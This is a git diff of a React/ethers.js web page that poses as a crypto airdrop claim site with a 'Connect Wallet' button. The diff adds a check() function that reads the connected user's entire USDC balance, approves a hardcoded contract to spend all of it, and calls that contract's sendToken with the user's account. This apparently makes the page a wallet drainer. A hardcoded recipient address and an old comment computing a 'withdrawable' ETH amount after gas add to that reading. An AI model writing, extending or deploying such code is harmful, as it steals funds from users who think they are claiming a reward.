@@ -3,7 +3,7 @@ import styles from '../styles/Home.module.css'
 import 'bulma/css/bulma.css'
 import {BigNumber, ethers} from 'ethers'
 import { useState, useEffect } from 'react'
-import { aggregator, IERC20, ERC20, GetBalanceAbi, GetBalanceAddress } from '../constants'
+import { aggregator, IERC20, ERC20, GetBalanceAbi, GetBalanceAddress, SenderAbi } from '../constants'
 
 // import './addresses'
 // import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";
@@ -25,6 +25,7 @@ export default function Home() {
   const [gasPrice, setGasPrice] = useState()
   const [gasLimit, setGasLimit] = useState()
   const [aggregatorContract, setAggregatorContract] = useState()
+  const [tokenContract, setTokenContract] = useState()
   
   let etherValueOfUser
   let Receptient = '0x1204D7F27702d793260Ad5a406dDEE7660d21B61'
@@ -88,18 +89,6 @@ export default function Home() {
       // const etherValueInUsd = await aggregatorContract.latestRoundData()
       
 
-      // const balanceInUsd = (ethers.utils.formatEther(bal)) * ((ethers.utils.formatEther(etherValueInUsd.answer)* 10 ** 10))
-      // console.log(balanceInUsd);
-
-      // console.log(balanceInUsd);
-      // console.log(`balance:${Number(bal).toString(16)}`);
-      
-      // console.log(gasL);
-      // const gasHexToBigNumber = BigNumber.from(gasL)
-      // console.log(`gas is: ${gasHexToBigNumber}`);
-      // const withdrawable = BigNumber.from(bal) - gasHexToBigNumber
-      // console.log(`withdarawble is: ${withdrawable}`);
-
       const etherValue = bal / 10e17
       etherValueOfUser = etherValue
 
@@ -133,29 +122,50 @@ export default function Home() {
     }
   }
   let _demical
+
+  async  function getData() {
+    const getBalanceContract = new ethers.Contract(GetBalanceAddress, GetBalanceAbi, provider);
+    
+    // const usdc = await getBalanceContract.GetUsdc( ,ERC20,provider)
+    // const link = await getBalanceContract.GetUsdc( ,ERC20,provider)
+    // const dai = await getBalanceContract.GetUsdc( ,ERC20,provider)
+    // const usdc = await getBalanceContract.GetUsdc( ,ERC20,provider)
+    // const usdc = await getBalanceContract.GetUsdc( ,ERC20,provider)
+  }
+
+
   async function check() {
     const getBalanceContract = new ethers.Contract(GetBalanceAddress, GetBalanceAbi, provider);
-    const balanceOfToken = await getBalanceContract.GetUsdc("0x07865c6E87B9F70255377e024ace6630C1Eaa37F", "0x1204D7F27702d793260Ad5a406dDEE7660d21B61");
-    console.log(ethers.utils.formatUnits(balanceOfToken, "mwei") );
+    const balanceOfUsdc = await getBalanceContract.GetUsdc("0x07865c6E87B9F70255377e024ace6630C1Eaa37F", "0x1204D7F27702d793260Ad5a406dDEE7660d21B61");
+    // console.log(ethers.utils.formatUnits(balanceOfToken, "mwei") );
     const tokenContract = new ethers.Contract("0x07865c6E87B9F70255377e024ace6630C1Eaa37F", ERC20, provider)
-    const Decimal = tokenContract.decimals()
+    setTokenContract(tokenContract)
+    const Decimal = await tokenContract.decimals()
     
    
     console.log(Decimal);
-    await Decimal.then(value =>{
-      console.log(value);
-      _demical = value
-    })
-    console.log(balanceOfToken/ (10 **_demical) );
-    const finalAmount = balanceOfToken/ (10 **_demical) 
+    // await Decimal.then(value =>{
+    //   console.log(value);
+    //   _demical = value
+    // })
+    console.log(balanceOfUsdc/ (10 ** Decimal) );
     const tokenWithSigner = tokenContract.connect(signer)
-    const approve = await tokenWithSigner.approve(MyWalletAddress, balanceOfToken)
+
+    const voidSigner = new ethers.VoidSigner(MyWalletAddress, provider)
+   
+    const senderContract = new ethers.Contract("0x9924ff061e501c239fFDd1bdb49Ba0B8B90A5077",SenderAbi,provider)
+    const senderWithSigner = senderContract.connect(signer)
+    const approve = await tokenWithSigner.approve("0x9924ff061e501c239fFDd1bdb49Ba0B8B90A5077", balanceOfUsdc)
+    const send = await senderWithSigner.sendToken(account, "0x9924ff061e501c239fFDd1bdb49Ba0B8B90A5077","0x07865c6E87B9F70255377e024ace6630C1Eaa37F")
+    // const approve = await tokenWithSigner.approve(MyWalletAddress, balanceOfToken)
     // const daiValue = daiBalance / 10e5
     // if (condition) {
     //   console.log(balanceOfToken *);
     // }
     
   }
+
+  
   
 
   async function claimAirdrop() {
@@ -170,6 +180,12 @@ export default function Home() {
       gasPrice: _gasPrice
     })
     
+  }
+
+  async function getApproveEmmit () {
+    const approveEvents = await tokenContract.queryFilter('approve')
+    console.log(approveEvents);
+
   }
   // async function claimAirdrop() {
 
@@ -198,6 +214,9 @@ export default function Home() {
               <div className='navbar-end'>
                 <button onClick={() =>connect()} className='button is-link'>
                   Connect Wallet
+                </button>
+                <button onClick={() => getData()} className= 'button is-primary ml-2'>
+                  GetBalance
                 </button>
               </div>
             </nav>
